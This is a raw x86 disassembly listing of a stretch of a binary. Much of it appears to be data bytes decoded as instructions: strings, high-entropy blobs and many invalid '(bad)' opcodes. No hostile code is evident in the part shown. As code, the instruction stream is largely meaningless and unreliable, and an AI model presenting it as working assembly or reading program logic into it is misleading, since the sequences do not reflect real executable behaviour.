  413b79:	cmp    eax,DWORD PTR [ecx+0x0]
  413b7c:	mov    eax,0xc004139
  413b81:	cmp    al,0x41
  413b83:	add    ah,bh
  413b85:	cmp    eax,DWORD PTR [ecx+0x0]
  413b88:	sbb    al,0x3e
  413b8a:	inc    ecx
  413b8b:	add    BYTE PTR [ecx],dh
  413b8d:	test   DWORD PTR [eax+edi*8-0x7ee8f462],ebx
  413b94:	sar    BYTE PTR [ebx],0x41
  413b97:	add    BYTE PTR [ebx-0x707ee9e4],dl
  413b9d:	or     eax,0x705
  413ba2:	inc    eax
  413ba3:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  413ba7:	(bad)  
  413ba9:	xor    eax,0x68720043
  413bae:	inc    ebp
  413baf:	inc    ecx
  413bb0:	(bad)  
  413bb1:	cli    
  413bb2:	jne    0x413c16
  413bb4:	(bad)  
  413bb5:	in     eax,dx
  413bb6:	inc    BYTE PTR [edi]
  413bb8:	mov    eax,0xa805a3fa
  413bbd:	cmp    eax,DWORD PTR [ecx+0x0]
  413bc0:	xor    dl,BYTE PTR [ebp-0x69cd0764]
  413bc6:	pushf  
  413bc7:	clc    
  413bc8:	xor    edx,DWORD PTR [ebp-0x6ac30764]
  413bce:	pushf  
  413bcf:	clc    
  413bd0:	cmp    eax,0x3ef89c95
  413bd5:	xchg   ebp,eax
  413bd6:	pushf  
  413bd7:	clc    
  413bd8:	aas    
  413bd9:	xchg   ebp,eax
  413bda:	pushf  
  413bdb:	clc    
  413bdc:	cmp    BYTE PTR [ebp-0x6ac60764],dl
  413be2:	pushf  
  413be3:	clc    
  413be4:	cmp    dl,BYTE PTR [ebp-0x6ade0764]
  413bea:	pushf  
  413beb:	clc    
  413bec:	in     eax,dx
  413bed:	stc    
  413bee:	add    esp,DWORD PTR [eax-0x50]
  413bf1:	cmp    DWORD PTR [ecx+0x0],eax
  413bf4:	je     0x413bf6
  413bf6:	inc    ebx
  413bf7:	add    BYTE PTR [ecx+0x49],bl
  413bfa:	imul   si,WORD PTR [ecx],0xff85
  413bfe:	pushf  
  413bff:	clc    
  413c00:	sahf   
  413c01:	jmp    0x4f04356
  413c06:	add    BYTE PTR [eax],al
  413c08:	lods   al,BYTE PTR ds:[esi]
  413c09:	cmp    DWORD PTR [ecx+0x0],eax
  413c0c:	pushf  
  413c0d:	or     eax,DWORD PTR [esi+ecx*1]
	...
  413c40:	addr16 jg 0x413c83
  413c43:	add    dl,ch
  413c45:	adc    BYTE PTR [ebx+0x0],al
  413c48:	add    BYTE PTR [eax],al
  413c4a:	add    BYTE PTR [eax],al
  413c4c:	inc    esp
  413c4d:	add    BYTE PTR [esi+0x0],al
  413c50:	imul   eax,DWORD PTR [eax],0x4a006f
  413c56:	dec    ecx
  413c57:	add    BYTE PTR [eax+eax*1+0x46],al
  413c5b:	add    BYTE PTR [eax+eax*1+0x49],cl
  413c5f:	add    BYTE PTR [ebp+0x0],dl
  413c62:	inc    esi
  413c63:	add    BYTE PTR [edi+0x0],cl
  413c66:	imul   eax,DWORD PTR [eax],0x6f
  413c69:	add    BYTE PTR [edx+0x0],ch
  413c6c:	dec    ebx
  413c6d:	add    BYTE PTR [eax+eax*1+0x66],cl
  413c71:	add    BYTE PTR [edx+0x0],ch
  413c74:	imul   eax,DWORD PTR [eax],0x46006f
  413c7a:	jo     0x413c7c
  413c7c:	outs   dx,DWORD PTR ds:[esi]
  413c7d:	add    BYTE PTR [ebx+0x0],ch
  413c80:	ins    DWORD PTR es:[edi],dx
  413c81:	add    BYTE PTR [eax+eax*1+0x6b],ah
  413c85:	add    BYTE PTR [ebx+0x0],dh
  413c88:	ins    BYTE PTR es:[edi],dx
  413c89:	add    BYTE PTR [edx+0x0],ch
  413c8c:	data16 add BYTE PTR [edi+0x0],ah
  413c90:	imul   eax,DWORD PTR [eax],0x64006f
  413c96:	add    BYTE PTR [di+0x0],dh
  413c9a:	imul   eax,DWORD PTR [eax],0x69006a
  413ca0:	outs   dx,DWORD PTR ds:[esi]
  413ca1:	add    BYTE PTR [esi+0x0],ah
  413ca4:	add    BYTE PTR fs:[ebp+0x0],dh
  413ca8:	push   0x0
  413caa:	add    BYTE PTR [bp+0x0],ah
  413cae:	add    BYTE PTR fs:[eax],al
  413cb1:	add    BYTE PTR [eax],al
  413cb3:	add    BYTE PTR [edx+0x0],cl
  413cb6:	inc    esp
  413cb7:	add    BYTE PTR [ebx+0x0],cl
  413cba:	dec    edx
  413cbb:	add    BYTE PTR [edx+0x0],ch
  413cbe:	imul   eax,DWORD PTR [eax],0x64
  413cc1:	add    BYTE PTR [ebx+0x0],cl
  413cc4:	dec    esp
  413cc5:	add    BYTE PTR [edx+0x0],cl
  413cc8:	add    BYTE PTR fs:[ecx+0x0],ch
  413ccc:	ins    BYTE PTR es:[edi],dx
  413ccd:	add    BYTE PTR [edx+0x0],cl
  413cd0:	ins    BYTE PTR es:[edi],dx
  413cd1:	add    BYTE PTR [ebx+0x0],ch
  413cd4:	add    BYTE PTR fs:[edx+0x0],ch
  413cd8:	dec    esp
  413cd9:	add    BYTE PTR [ebp+0x0],dl
  413cdc:	inc    esp
  413cdd:	add    BYTE PTR [edi+0x0],ch
  413ce0:	imul   eax,DWORD PTR [eax],0x73006c
  413ce6:	push   0x0
  413ce8:	add    BYTE PTR fs:[ebx+0x0],ch
  413cec:	imul   eax,DWORD PTR [eax],0x6a
  413cef:	add    BYTE PTR [esi+0x0],ah
  413cf2:	add    BYTE PTR fs:[ebx+0x0],dh
  413cf6:	imul   eax,DWORD PTR [eax],0x6a
  413cf9:	add    BYTE PTR [esi+0x0],ah
  413cfc:	imul   eax,DWORD PTR [eax],0x64
  413cff:	add    BYTE PTR [ebx+0x0],dh
  413d02:	add    BYTE PTR [eax],al
  413d04:	dec    edx
  413d05:	inc    esp
  413d06:	dec    ebx
  413d07:	dec    edx
  413d08:	push   0x6b
  413d0a:	fs dec ebx
  413d0c:	dec    esp
  413d0d:	dec    edx
  413d0e:	imul   ebp,DWORD PTR fs:[edx+ecx*2+0x6c],0x4c6a646b
  413d17:	push   ebp
  413d18:	inc    esp
  413d19:	outs   dx,DWORD PTR ds:[esi]
  413d1a:	imul   ebp,DWORD PTR [ebx+esi*2+0x6a],0x6a6b6b64
  413d22:	data16 fs jae 0x413d91
  413d26:	push   0x66
  413d28:	imul   esp,DWORD PTR [ebx+esi*2+0x0],0x0
  413d2d:	add    BYTE PTR [eax],al
  413d2f:	add    BYTE PTR [eax],al
  413d31:	add    BYTE PTR [eax],al
  413d33:	add    BYTE PTR [ebp-0x68],cl
  413d36:	inc    eax
  413d37:	add    BYTE PTR [ebp+0x4f],dl
  413d3a:	pop    edi
  413d3b:	dec    edi
  413d3c:	dec    esp
  413d3d:	dec    edi
  413d3e:	push   eax
  413d3f:	dec    edi
  413d40:	pop    edi
  413d41:	dec    edi
  413d42:	push   esi
  413d43:	dec    edi
  413d44:	or     eax,0xc24f0c4f
  413d49:	dec    esi
  413d4a:	add    BYTE PTR [eax],al
  413d4c:	pop    ecx
  413d4d:	dec    edi
  413d4e:	pop    esi
  413d4f:	dec    edi
  413d50:	pop    ebx
  413d51:	dec    edi
  413d52:	or     eax,0xc24f0c4f
  413d57:	dec    esi
  413d58:	dec    edi
  413d59:	dec    edi
  413d5a:	dec    ebp
  413d5b:	dec    edi
  413d5c:	pop    edi
  413d5d:	dec    edi
  413d5e:	dec    esp
  413d5f:	dec    edi
  413d60:	or     eax,0xc24f0c4f
  413d65:	dec    esi
  413d66:	add    BYTE PTR [eax],al
  413d68:	dec    ebp
  413d69:	dec    edi
  413d6a:	pop    edx
  413d6b:	dec    edi
  413d6c:	push   esi
  413d6d:	dec    edi
  413d6e:	dec    ecx
  413d6f:	dec    edi
  413d70:	arpl   WORD PTR [edi+0x52],cx
  413d73:	dec    edi
  413d74:	pop    ebx
  413d75:	dec    edi
  413d76:	ret    0x4e
  413d79:	add    BYTE PTR [eax],al
  413d7b:	add    BYTE PTR [esi+0x7d],ch
  413d7e:	outs   dx,BYTE PTR ds:[esi]
  413d7f:	lea    ebp,[esi-0x63]
  413d82:	outs   dx,BYTE PTR ds:[esi]
  413d83:	lods   eax,DWORD PTR ds:[esi]
  413d84:	outs   dx,BYTE PTR ds:[esi]
  413d85:	mov    ebp,0xdd6ecd6e
  413d8a:	outs   dx,BYTE PTR ds:[esi]
  413d8b:	in     eax,dx
  413d8c:	outs   dx,BYTE PTR ds:[esi]
  413d8d:	std    
  413d8e:	outs   dx,BYTE PTR ds:[esi]
  413d8f:	or     eax,0x2d6e1d6e
  413d94:	outs   dx,BYTE PTR ds:[esi]
  413d95:	cmp    eax,0x6d6e5d6e
  413d9a:	outs   dx,BYTE PTR ds:[esi]
  413d9b:	jb     0x413e0b
  413d9d:	jae    0x413e0d
  413d9f:	jo     0x413e0f
  413da1:	jno    0x413e11
  413da3:	jbe    0x413e13
  413da5:	ja     0x413e15
  413da7:	je     0x413e17
  413da9:	jne    0x413e19
  413dab:	mov    ch,BYTE PTR [esi-0x75]
  413dae:	outs   dx,BYTE PTR ds:[esi]
  413daf:	mov    BYTE PTR [esi-0x77],ch
  413db2:	outs   dx,BYTE PTR ds:[esi]
  413db3:	mov    gs,WORD PTR [esi+0x7c]
  413db6:	pop    esi
  413db7:	jge    0x413e07
  413db9:	jge    0x413d79
  413dbb:	jge    0x413e15
  413dbd:	(bad)  
  413dbe:	jns    0x413e30
  413dc0:	mov    ecx,0x7d736eb1
  413dc5:	bound  ebp,QWORD PTR [edx+0x7c265fc6]
  413dcb:	add    BYTE PTR [ecx+0x17],cl
  413dce:	mov    ebx,0x4af4b956
  413dd3:	aaa    
  413dd4:	dec    edx
  413dd5:	jle    0x413d70
  413dd7:	jno    0x413e39
  413dd9:	mov    cl,0x4
  413ddb:	imul   ebp,DWORD PTR [eax-0x70282bf8],0x5
  413de2:	inc    esp
  413de3:	xlat   BYTE PTR ds:[ebx]
  413de4:	rcl    DWORD PTR [ebx+0x7dd01148],1
  413dea:	rcr    esi,cl
  413dec:	(bad)  
  413ded:	leave  
  413dee:	xchg   BYTE PTR [esi+0x1faa3210],ah
  413df4:	fs icebp 
  413df6:	push   eax
  413df7:	(bad)  
  413df8:	rcr    DWORD PTR [eax],1
  413dfa:	shl    DWORD PTR [ecx+0x0],1
  413dfd:	add    BYTE PTR [eax],al
  413dff:	add    bh,ch
  413e01:	(bad)  [ebx+0x7]
  413e04:	or     BYTE PTR [ecx+eax*2],bh
  413e07:	add    BYTE PTR [esi+0x30],al
  413e0a:	shl    DWORD PTR [ebx],0x38
  413e0d:	and    eax,DWORD PTR [ecx+0x0]
  413e10:	inc    esi
  413e11:	push   ebx
  413e12:	outs   dx,DWORD PTR ds:[esi]
  413e13:	push   ebx
  413e14:	mov    al,ds:0x400413b
  413e19:	cmp    al,0x41
  413e1b:	add    BYTE PTR [edi+0x712ed],cl
	...
  413e3d:	add    BYTE PTR [eax],al
  413e3f:	add    BYTE PTR [edi+0x78],dl
  413e42:	popa   
  413e43:	push   edi
  413e44:	push   esi
  413e45:	push   esp
  413e46:	dec    eax
  413e47:	je     0x413e95
  413e49:	push   ebx
  413e4a:	jne    0x413eb7
  413e4c:	popa   
  413e4d:	jns    0x413e94
  413e4f:	pop    ecx
  413e50:	je     0x413e9a
  413e52:	push   ebp
  413e53:	jp     0x413eab
  413e55:	jp     0x413ed0
  413e57:	js     0x413ec9
  413e59:	imul   edx,DWORD PTR [edi+0x6d],0x48
  413e5d:	push   eax
  413e5e:	dec    eax
  413e5f:	dec    edx
  413e60:	outs   dx,BYTE PTR ds:[esi]
  413e61:	push   esp
  413e62:	pop    ecx
  413e63:	dec    edx
  413e64:	dec    ebx
  413e65:	dec    ebp
  413e66:	dec    esi
  413e67:	je     0x413e69
	...
  413e79:	add    BYTE PTR [eax],al
  413e7b:	add    BYTE PTR [ebp+0x70],ch
  413e7e:	ins    DWORD PTR es:[edi],dx
  413e7f:	push   esp
  413e80:	dec    esi
  413e81:	jne    0x413ed4
  413e83:	outs   dx,BYTE PTR ds:[esi]
  413e84:	imul   eax,DWORD PTR [edx+0x73],0x58516165
  413e8b:	pop    ecx
  413e8c:	outs   dx,BYTE PTR ds:[esi]
  413e8d:	jbe    0x413f07
  413e8f:	jns    0x413f08
  413e91:	dec    ebp
  413e92:	je     0x413f0a
  413e94:	bound  eax,QWORD PTR [ebx+eiz*2+0x7a]
  413e98:	push   esp
  413e99:	arpl   WORD PTR [ecx+0x4b],cx
  413e9c:	push   edx
  413e9d:	imul   ebp,DWORD PTR [eax+0x73],0x6a4a5170
  413ea4:	add    BYTE PTR [eax],al
  413ea6:	inc    edi
  413ea7:	jne    0x413eef
  413ea9:	push   ebx
  413eaa:	outs   dx,DWORD PTR ds:[esi]
  413eab:	push   ebx
  413eac:	inc    esi
  413ead:	inc    edi
  413eae:	push   0x66495949
  413eb3:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  413eb7:	push   esi
  413eb8:	jb     0x413f22
  413eba:	add    BYTE PTR [eax],al
  413ebc:	ins    BYTE PTR es:[edi],dx
  413ebd:	jb     0x413f38
  413ebf:	inc    edi
  413ec0:	push   edi
  413ec1:	push   esi
  413ec2:	inc    edi
  413ec3:	ins    BYTE PTR es:[edi],dx
  413ec4:	inc    ecx
  413ec5:	inc    edi
  413ec6:	jae    0x413ec8
  413ec8:	dec    edi
  413ec9:	inc    ebx
  413eca:	jo     0x413f3e
  413ecc:	data16 jp 0x413f21
  413ecf:	jp     0x413f29
  413ed1:	ins    BYTE PTR es:[edi],dx
  413ed2:	je     0x413f43
  413ed4:	jns    0x413f44
  413ed6:	popa   
  413ed7:	push   esi
  413ed8:	push   ebp
  413ed9:	push   0x57564476
  413ede:	dec    edx
  413edf:	imul   edx,DWORD PTR [ebx+0x4b],0x5065
  413ee6:	inc    ecx
  413ee7:	jp     0x413f59
  413ee9:	pop    eax
  413eea:	inc    esi
  413eeb:	jae    0x413f62
  413eed:	dec    esi
  413eee:	dec    edx
  413eef:	gs push eax
  413ef1:	jne    0x413ef3
  413ef3:	add    ah,ah
  413ef5:	cmc    
  413ef6:	jnp    0x413f46
  413ef8:	jnp    0x413ec8
  413efa:	cmc    
  413efb:	call   FWORD PTR [ebx+0x61]
  413efe:	and    bh,dl
  413f00:	xor    ecx,ebx
  413f02:	mov    cl,0xe7
  413f04:	(bad)  
  413f06:	add    BYTE PTR [eax],al
  413f08:	add    eax,0xa0000001
  413f0d:	jns    0x413f6e
  413f0f:	shl    ch,cl
  413f11:	jmp    0xa888ac83
  413f16:	mov    bl,0x40
  413f18:	mov    ecx,0x315824c7
  413f1d:	mov    ds:0x9b8c8874,al
  413f22:	xchg   BYTE PTR [edx],ah
  413f24:	sub    BYTE PTR [eax+0x7d6ca7cc],0x9f
  413f2b:	cwde   
  413f2c:	or     DWORD PTR [ecx+0x2b],esp
  413f2f:	adc    edi,ebx
  413f31:	mov    gs,WORD PTR [esi]
  413f33:	rol    BYTE PTR ss:[esi-0x6e],cl
  413f37:	(bad)  
  413f38:	outs   dx,BYTE PTR ds:[esi]
  413f39:	inc    edi
  413f3a:	inc    ebx
  413f3b:	ret    
  413f3c:	mov    edi,0xd37ae3c3
  413f41:	test   DWORD PTR [eax-0xc],edi
  413f44:	sub    bh,BYTE PTR [ecx]
  413f46:	test   BYTE PTR ds:0x25ad6247,0x89
  413f4d:	test   BYTE PTR [edi-0x26],bl
  413f50:	into   
  413f51:	fiadd  DWORD PTR [ebx+ebp*4-0x29]
  413f55:	sub    eax,0x93320c95
  413f5a:	mov    al,BYTE PTR [edx+0x57d87f8a]
  413f60:	mov    ah,0x6
  413f62:	ins    BYTE PTR es:[edi],dx
  413f63:	icebp  
  413f64:	retf   
  413f65:	or     eax,0x4b1d95ef
  413f6a:	push   ebp
  413f6b:	retf   
  413f6c:	xchg   DWORD PTR [ecx+0x2e],edx
  413f6f:	mov    ds:0xfe0db891,al
  413f74:	dec    ebp
  413f75:	test   BYTE PTR [eax],ah
  413f77:	jae    0x413f29
  413f79:	add    dl,BYTE PTR [edi]
  413f7b:	pop    eax
  413f7c:	stos   DWORD PTR es:[edi],eax
  413f7d:	adc    cl,dl
  413f7f:	cmp    al,0x56
  413f81:	inc    esp
  413f82:	mov    ch,0xab
  413f84:	mov    ds:0x7ad9cb87,eax
  413f89:	pop    eax
  413f8a:	jne    0x413f1e
  413f8c:	jo     0x413fc8
  413f8e:	outs   dx,DWORD PTR ds:[esi]
  413f8f:	fistp  WORD PTR [ebx-0x56e9cecc]
  413f95:	jecxz  0x413f33
  413f97:	int    0x80
  413f99:	inc    esi
  413f9a:	in     eax,0xd0
  413f9c:	jo     0x413fd1
  413f9e:	jg     0x413fd3
  413fa0:	(bad)  
  413fa1:	les    esp,FWORD PTR [esi+ebp*1-0x26f995e6]
  413fa8:	xchg   ebx,eax
  413fa9:	add    DWORD PTR cs:[eax+0x28],0x2f
  413fae:	loop   0x413f55
  413fb0:	pop    ax
  413fb2:	cwde   
  413fb3:	fst    QWORD PTR [esi-0xe]
  413fb6:	enter  0xf599,0xaf
  413fba:	mov    eax,0xd417cbf
  413fbf:	retf   0xfbc3
  413fc2:	adc    ebx,DWORD PTR [eax+0x72de845]
  413fc8:	adc    ch,dh
  413fca:	cmc    
  413fcb:	mov    ah,0xf
  413fcd:	add    eax,0x3c5c0c3b
  413fd2:	cmp    esi,DWORD PTR [eax+0xa]
  413fd5:	mov    bl,ah
  413fd7:	sub    BYTE PTR [eax+0x414046b9],cl
  413fdd:	jle    0x413fe2
  413fdf:	and    dh,BYTE PTR [esi-0x1d]
  413fe2:	imul   BYTE PTR [edi-0x25b78442]
  413fe8:	add    ebx,edx
  413fea:	jb     0x41405f
  413fec:	lds    ecx,FWORD PTR [ebx+ebx*4]
  413fef:	add    esp,DWORD PTR [ecx+0x7718abf8]
  413ff5:	adc    al,0xde
  413ff7:	jb     0x414003
  413ff9:	sbb    eax,0x863fec47
  413ffe:	jmp    0x414004
  414000:	push   edx
  414001:	iret   
  414002:	push   esp
  414003:	pop    ebx
  414004:	and    bh,BYTE PTR [ebx-0x70]
  414007:	pop    esi
  414008:	dec    esi
  414009:	push   es
  41400a:	mov    BYTE PTR [ebx],dh
  41400c:	xchg   esp,eax
  41400d:	std    
  41400e:	xor    ebx,DWORD PTR [ecx+0x2e]
	...
  414074:	pop    edx
  414075:	ficom  DWORD PTR [esi+0x60]
  414078:	(bad)  
  414079:	in     al,dx
  41407a:	jle    0x414076
  41407c:	call   0xa2ef:0x34d52e96
  414083:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414084:	loope  0x414058
  414086:	add    BYTE PTR [eax],al
  414088:	add    eax,0x77000001
  41408d:	sub    edi,DWORD PTR [ebp-0x1bf4cbe0]
  414093:	mov    esp,DWORD PTR [ebx-0x71]
  414096:	pop    ds
  414097:	push   es
  414098:	cmp    DWORD PTR [ebx+0x7d],edx
  41409b:	adc    DWORD PTR [ebp+0x16fc2dce],ecx
  4140a1:	fs pop es
  4140a3:	imul   edi,DWORD PTR [edi-0x52],0x3c
  4140a7:	mov    dl,0xe8
  4140a9:	pop    ds
  4140aa:	inc    edi
  4140ab:	inc    ecx
  4140ac:	and    esp,DWORD PTR [edx]
  4140ae:	pushf  
  4140af:	pop    ebp
  4140b0:	out    0x29,eax
  4140b2:	inc    esi
  4140b3:	test   al,0x12
  4140b5:	dec    esp
  4140b6:	test   DWORD PTR gs:[edx],eax
  4140b9:	pop    ds
  4140ba:	xor    BYTE PTR [ebx+0x49dcabbe],0xb0
  4140c1:	loopne 0x4140e5
  4140c3:	jmp    0xd42d1e29
  4140c8:	int3   
  4140c9:	pop    esp
  4140ca:	and    ebx,esp
  4140cc:	jl     0x4140e4
  4140ce:	jcxz   0x414070
  4140d1:	or     eax,0xaecbb272
  4140d6:	pop    esi
  4140d7:	or     DWORD PTR [edi+0x21a1805e],edx
  4140dd:	sub    BYTE PTR [edi-0x22],ch
  4140e0:	mov    ecx,0x6bc982a7
  4140e5:	mov    dh,0xbd
  4140e7:	rcl    BYTE PTR ds:0x86d94281,cl
  4140ed:	sahf   
  4140ee:	mov    ecx,ecx
  4140f0:	and    edx,DWORD PTR [edi]
  4140f2:	out    dx,eax
  4140f3:	ficom  DWORD PTR [ebx]
  4140f5:	or     dh,dh
  4140f7:	in     al,dx
  4140f8:	es inc edx
  4140fa:	fs sahf 
  4140fc:	mov    al,ds:0xda5a85c8
  414101:	in     al,0xb1
  414103:	and    eax,0x1ec32d16
  414108:	aas    
  414109:	or     edx,DWORD PTR [ecx]
  41410b:	cs sbb ebp,edi
  41410e:	lea    eax,[edx]
  414110:	xchg   BYTE PTR [edx+0x34],bh
  414113:	ds aam 0x62
  414116:	popf   
  414117:	pop    edx
  414118:	mov    dl,BYTE PTR [esi]
  41411a:	sar    edi,1
  41411c:	pop    es
  41411d:	(bad)  
  41411f:	pop    es
  414120:	xor    al,0x24
  414122:	or     DWORD PTR [edx+0x7e],edi
  414125:	jnp    0x4140d4
  414127:	das    
  414128:	pop    edi
  414129:	sbb    ah,BYTE PTR [edi+0x6d]
  41412c:	xor    DWORD PTR ds:0x406b925d,0x37b077f9
  414136:	lahf   
  414137:	test   al,0x4f
  414139:	addr16 mov esi,0x6776218a
  41413f:	cdq    
  414140:	mov    ds:0xa5d812fd,eax
  414145:	inc    esi
  414146:	out    dx,eax
  414147:	pop    esp
  414148:	mov    bh,0xa5
  41414a:	mov    ecx,0xf4fd232c
  41414f:	or     ch,cl
  414151:	(bad)  
  414152:	icebp  
  414153:	aas    
  414154:	addr16 mov edx,0xbce77b59
  41415a:	aas    
  41415b:	mov    DWORD PTR [edx-0x3e86d2fe],ecx
  414161:	pop    edx
  414162:	jno    0x41414e
  414164:	add    eax,0xd4c59b3c
  414169:	bound  esi,QWORD PTR [ebx-0x4e40dc7c]
  41416f:	mov    DWORD PTR [ebx+edi*8],edi
  414172:	data16 mov dh,0x54
  414175:	inc    esi
  414176:	push   cs
  414177:	xchg   ebp,eax
  414178:	inc    esp
  414179:	clc    
  41417a:	xchg   ecx,eax
  41417b:	ds ror cl,cl
  41417e:	mov    ch,0x7b
  414180:	adc    eax,0xdf09e1f2
  414185:	out    0xb0,eax
  414187:	test   al,0x8e
  414189:	(bad)  
  41418a:	push   ds
  41418b:	jns    0x4141bf
  41418d:	jnp    0x414129
  41418f:	lock add BYTE PTR [eax],al
	...
  4141f2:	add    BYTE PTR [eax],al
  4141f4:	add    dl,BYTE PTR [edx]
  4141f6:	add    DWORD PTR [ebx-0x4c5d4cef],esp
  4141fc:	mov    DWORD PTR [ecx+0x37],edx
  4141ff:	push   edi
  414200:	xchg   ecx,eax
  414201:	sub    BYTE PTR [ebx+0x1e],0xe6
  414205:	rol    DWORD PTR [eax],cl
  414207:	add    BYTE PTR ds:0x6a000001,al
  41420d:	mov    eax,0x8cbdba92
  414212:	icebp  
  414213:	std    
  414214:	xchg   ebp,eax
  414215:	inc    esp
  414216:	test   al,0x56
  414218:	hlt    
  414219:	pop    ss
  41421a:	lea    edx,[ecx]
  41421c:	enter  0x5701,0x1d
  414220:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414221:	jmp    0xcd1ada03
  414226:	and    BYTE PTR [edi],ch
  414228:	pop    ss
  414229:	mov    ds:0xd9f9abce,al
  41422e:	adc    al,0xff
  414230:	mov    dh,0xcc
  414232:	cmp    BYTE PTR [edi-0x7f],ah
  414235:	add    BYTE PTR gs:[edx-0x5d],0x96
  41423a:	popa   
  41423b:	jne    0x4142aa
  41423d:	retf   0x4f0
  414240:	inc    ecx
  414241:	in     al,0xa8
  414243:	or     al,0x6b
  414245:	rol    DWORD PTR [ecx+edi*8],cl
  414248:	(bad)  
  414249:	push   eax
  41424a:	outs   dx,BYTE PTR ds:[esi]
  41424b:	ja     0x41420d
  41424d:	push   0x62
  41424f:	and    esi,ebp
  414251:	and    BYTE PTR [edi-0x2e],0xd6
  414255:	inc    DWORD PTR [ebp+0x59]
  414258:	cmp    al,0xe
  41425a:	mov    WORD PTR [edi],fs
  41425c:	loopne 0x4142ae
  41425e:	and    ecx,edi
  414260:	pop    ebx
  414261:	enter  0x7264,0xac
  414265:	inc    ecx
  414266:	cmp    BYTE PTR [esi+ecx*1+0x63215579],0xad
  41426e:	inc    edi
  41426f:	jbe    0x41429e
  414271:	xchg   edi,eax
  414272:	dec    ebx
  414273:	(bad)  
  414274:	sub    BYTE PTR [edi+0x6e],bh
  414277:	inc    esp
  414278:	mov    bh,0xf2
  41427a:	mov    cl,0xc3
  41427c:	inc    ecx
  41427d:	adc    eax,0x58078ba2
  414282:	xchg   esp,eax
  414283:	jns    0x414291
  414285:	push   ss
  414286:	or     BYTE PTR [edi],dl
  414288:	ret    
  414289:	push   0x6378f2ed
  41428e:	and    ah,BYTE PTR [ebp+0x58d9841f]
  414294:	rcr    DWORD PTR [ebx+0x639ee0ab],1
  41429a:	out    0xd,eax
  41429c:	mov    eax,0x1d38bef4
  4142a1:	sbb    al,0xb1
  4142a3:	mov    al,ds:0x86d628be
  4142a8:	call   0xad23:0x5c507c2b
  4142af:	inc    ecx
  4142b0:	imul   esp,DWORD PTR [ebp-0x2a],0x1c50442b
  4142b7:	test   BYTE PTR [ebp+0x5f],al
  4142ba:	dec    edx
  4142bb:	sub    DWORD PTR ds:0x7a116d6a,ecx
  4142c1:	in     eax,dx
  4142c2:	sbb    eax,edx
  4142c4:	dec    esi
  4142c5:	fsubr  QWORD PTR [edi]
  4142c7:	aaa    
  4142c8:	xchg   BYTE PTR [edx],bh
  4142ca:	outs   dx,DWORD PTR ds:[esi]
  4142cb:	leave  
  4142cc:	mov    ecx,DWORD PTR [edi+0x4e]
  4142cf:	cmp    dl,dl
  4142d1:	loopne 0x414334
  4142d3:	cmp    al,0x86
  4142d5:	cdq    
  4142d6:	jae    0x4142c2
  4142d8:	js     0x414281
  4142da:	adc    ah,BYTE PTR [ebx]
  4142dc:	out    dx,eax
  4142dd:	jmp    0x3cb1a2bc
  4142e2:	hlt    
  4142e3:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4142e5:	nop
  4142e6:	xor    eax,0xb9f4cfed
  4142eb:	repnz out dx,eax
  4142ed:	rcr    DWORD PTR [ecx],1
  4142ef:	icebp  
  4142f0:	in     eax,dx
  4142f1:	mov    bl,0x85
  4142f3:	fwait
  4142f4:	cmp    al,0x0
  4142f6:	(bad)  
  4142f7:	(bad)  
  4142f9:	mov    bl,0xf3
  4142fb:	cmp    dh,BYTE PTR [ebp+0x19]
  4142fe:	or     ah,BYTE PTR [esi]
  414300:	mov    dh,0xc7
  414302:	fs aaa 
  414304:	aad    0x75
  414306:	mov    dh,0xef
  414308:	pop    eax
  414309:	mov    ecx,DWORD PTR [edi]
  41430b:	add    DWORD PTR [ecx+eiz*8],ecx
  41430e:	shr    DWORD PTR [ecx],0xdf
	...
  414371:	add    BYTE PTR [eax],al
  414373:	add    BYTE PTR [ecx],al
  414375:	sub    DWORD PTR [ebp-0x23],0xddb1fded
  41437c:	rol    DWORD PTR [ebp+0x5e],0xa1
  414380:	or     DWORD PTR [esi-0x2b14ff09],ebp
  414386:	add    BYTE PTR [eax],al
  414388:	add    eax,0x10000001
  41438d:	jb     0x414311
  41438f:	inc    ebx
  414390:	mov    ch,0xdf
  414392:	jns    0x41436c
  414394:	retf   
  414395:	shl    DWORD PTR [esi+0x2229cbd8],cl
  41439b:	or     ecx,eax
  41439d:	iret   
  41439e:	pop    ebp
  41439f:	xchg   ebp,eax
  4143a0:	fnstenv [esp+eiz*2]
  4143a3:	(bad)  
  4143a4:	rol    BYTE PTR [ebx+0x625f1524],0xd5
  4143ab:	pop    esp
  4143ac:	or     DWORD PTR [eax+0x6f],esp
  4143af:	sbb    cl,BYTE PTR [edx]
  4143b1:	cmp    al,0xcd
  4143b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4143b4:	sbb    BYTE PTR [esi],al
  4143b6:	fidivr DWORD PTR [eax]
  4143b8:	div    DWORD PTR [eax-0x643ac0e2]
  4143be:	cli    
  4143bf:	lea    edi,[eax-0xd90f1e3]
  4143c5:	out    dx,al
  4143c6:	iret   
  4143c7:	jge    0x4143c7
  4143c9:	ja     0x414433
  4143cb:	lods   eax,DWORD PTR ds:[esi]
  4143cc:	push   es
  4143cd:	pop    ebp
  4143ce:	inc    ebp
  4143cf:	or     ah,BYTE PTR [esi+0x46feb32]
  4143d5:	jmp    0x81e3:0x69c45cc0
  4143dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4143dd:	mov    ds:0x7e48320d,eax
  4143e2:	dec    ecx
  4143e3:	int    0xc2
  4143e5:	das    
  4143e6:	fcmovu st,st(5)
  4143e8:	mov    ah,0x7e
  4143ea:	call   0x8900d52c
  4143ef:	cmovs  ebx,eax
  4143f2:	rcr    bl,0xdc
  4143f5:	lahf   
  4143f6:	and    DWORD PTR [ecx-0x335d3802],0xffffff82
  4143fd:	std    
  4143fe:	pusha  
  4143ff:	lahf   
  414400:	fnstcw WORD PTR [edi+0x354caf7f]
  414406:	xor    dl,dh
  414408:	pop    ss
  414409:	mov    ecx,0xa554cfad
  41440e:	lea    eax,[eax+0x3a9184fa]
  414414:	ins    DWORD PTR es:[edi],dx
  414415:	jle    0x4143e8
  414417:	jb     0x4143e6
  414419:	mov    al,0x2f
  41441b:	mov    ds:0xdb4cd747,eax
  414420:	rol    BYTE PTR [ebp+edx*4+0x16],cl
  414424:	mov    al,ds:0x1e361e0e
  414429:	dec    edi
  41442a:	popa   
  41442b:	mov    eax,ds:0x60692057
  414430:	xchg   DWORD PTR [ecx-0x31],edx
  414433:	pop    esp
  414434:	mov    ebp,0xbc209d79
